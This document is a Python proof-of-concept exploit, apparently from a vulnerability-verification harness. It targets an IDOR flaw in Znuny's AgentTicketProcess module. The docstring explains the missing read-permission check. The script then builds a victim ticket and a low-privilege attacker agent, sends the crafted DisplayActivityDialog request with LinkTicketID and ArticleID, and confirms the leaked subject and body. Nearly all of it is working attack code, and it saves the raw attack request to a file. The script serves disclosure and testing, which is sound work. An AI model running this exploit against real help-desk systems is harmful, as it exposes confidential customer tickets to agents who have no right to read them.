#!/usr/bin/env python3
r"""
VULN-005 — AgentTicketProcess split reads an arbitrary ticket + article body without `ro`
==========================================================================================
Vulnerable code : targets/Znuny/Kernel/Modules/AgentTicketProcess.pm:85-113 (fetch before gate),
                  permission gate at :115 is inside `if ($TicketID)` and never runs for a new/split process
Vulnerability   : CWE-639 IDOR (information disclosure)

Flaw
----
At the top of Run(), when `LinkTicketID`/`ArticleID` are present the module unconditionally does:

    86:  my %TicketData = $TicketObject->TicketGet( TicketID => $Self->{LinkTicketID}, ... );
   104:  my %Article    = $ArticleBackendObject->ArticleGet( TicketID => $Self->{LinkTicketID}, ArticleID => ... );

There is NO `ro` permission check on `$Self->{LinkTicketID}`. The only permission gate is inside
`if ($TicketID) { ... }` at :115, which is skipped on a *new/split* process action (no TicketID).
The fetched subject/body are then pre-filled into the process activity-dialog form
(Title field + Body textarea). `AgentTicketEmail.pm:467` / `AgentTicketPhone.pm:338` check `ro`
on their split source — proving the omission.

Precondition: at least one deployed Process whose start activity dialog has Title + Article
fields (a normal Znuny configuration). The exploit imports a minimal such process from the bundled
`minimal_process.yml` fixture and deploys it.

Exploit: a low-priv agent with NO permission on the victim ticket reads its subject + article body
by pointing `LinkTicketID`/`ArticleID` at it.
"""
import os, sys, re
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-005", "AgentTicketProcess split reads any ticket + article body (no ro)",
             ["LinkTicketID/ArticleID fetched at pm:85-113 BEFORE the `if($TicketID)` gate at pm:115"])
    sfx = C.rid()

    # --- setup: ensure a Process with a Title+Article start dialog is deployed --------
    adm = C.agent_client(C.ADMIN_USER, C.ADMIN_PASS)
    tok, _ = adm.refresh_token(C.AGENT_URL + "?Action=AdminProcessManagement")
    yml = open(os.path.join(HERE, "minimal_process.yml"), "rb").read()
    C.log("SETUP", "importing minimal_process.yml (a process whose start dialog has Title+Article)")
    imp = adm.s.post(C.AGENT_URL, data={"Action": "AdminProcessManagement", "Subaction": "ProcessImport",
                                        "ChallengeToken": tok, "OverwriteExistingEntities": "1",
                                        "FormID": C.rid()},
                     files={"FileUpload": ("minimal_process.yml", yml, "text/yaml")}, timeout=30)
    adm.get({"Action": "AdminProcessManagement", "Subaction": "ProcessSync", "ChallengeToken": tok})
    C.cache_delete()
    prow = C.db("SELECT entity_id FROM pm_process WHERE name='Stage10MinimalProcess' LIMIT 1")
    drow = C.db("SELECT entity_id FROM pm_activity_dialog WHERE name='Stage10Dialog' LIMIT 1")
    if not (prow and drow):
        C.failed("process/dialog not present after import")
    pe, ade = prow[0][0], drow[0][0]
    C.log("SETUP", f"deployed process {pe[:22]}… dialog {ade[:22]}…")

    # --- victim ticket in an off-limits queue, with unique subject+body markers -------
    g = C.create_group(f"vg005_{sfx}"); q = C.create_queue(f"vq005_{sfx}", group=g)
    subj, body = f"SUBJMARK{sfx}", f"BODYMARK{sfx}"
    vtid, _ = C.create_ticket(subj, q, body=body, customer_id=f"vc{sfx}", customer_user=f"vc{sfx}")
    aid = C.db(f"SELECT id FROM article WHERE ticket_id={vtid} ORDER BY id DESC LIMIT 1")[0][0]
    C.log("SETUP", f"victim ticket {vtid} (subject {subj}, body {body}) in off-limits queue {q}")

    au, ap = C.create_agent(login=f"att005_{sfx}", groups=["users"])
    a = C.agent_client(au, ap)
    vperm = C.perm_check(au, vtid)
    C.log("PROOF", f"attacker TicketPermission on victim {vtid}: {vperm} (all 0 = off-limits)")
    if any(vperm.values()):
        C.failed("premise broken: attacker already has rights on the victim")

    # attack: render the activity dialog with LinkTicketID/ArticleID pointing at the victim
    C.log("STEP", f"attacker GET AgentTicketProcess DisplayActivityDialog LinkTicketID={vtid} ArticleID={aid}")
    r = a.get({"Action": "AgentTicketProcess", "Subaction": "DisplayActivityDialog",
               "ProcessEntityID": pe, "ActivityDialogEntityID": ade,
               "LinkTicketID": vtid, "ArticleID": aid})
    subj_leak = subj in r.text
    body_leak = body in r.text
    C.log("PROOF", f"victim SUBJECT leaked into process form: {subj_leak}")
    C.log("PROOF", f"victim ARTICLE BODY leaked into process form: {body_leak}")

    open(os.path.join(HERE, "request.http"), "w").write(
        "GET /znuny/index.pl?Action=AgentTicketProcess;Subaction=DisplayActivityDialog;"
        f"ProcessEntityID={pe};ActivityDialogEntityID={ade};LinkTicketID={vtid};ArticleID={aid}"
        " HTTP/1.1\r\nCookie: OTRSAgentInterface=<low-priv attacker>\r\n")
    ctx = ""
    i = r.text.find(body)
    if i >= 0:
        ctx = r.text[i-60:i+40].replace("\n", " ")
    open(os.path.join(HERE, "response.txt"), "w").write(
        f"attacker perm on victim={vperm}\nsubject_leak={subj_leak} body_leak={body_leak}\nCTX: {ctx}\n")

    if subj_leak and body_leak:
        C.confirmed(f"low-priv attacker (no rights on victim {vtid}) read the victim's SUBJECT and "
                    "ARTICLE BODY via AgentTicketProcess split (LinkTicketID/ArticleID) — the `ro` "
                    "permission gate is skipped on the new-process path.")
    elif subj_leak or body_leak:
        C.confirmed(f"low-priv attacker read victim ticket content (subject={subj_leak}, "
                    f"body={body_leak}) via AgentTicketProcess split without `ro`.")
    else:
        C.failed("no victim content leaked into the process form")

if __name__ == "__main__":
    main()
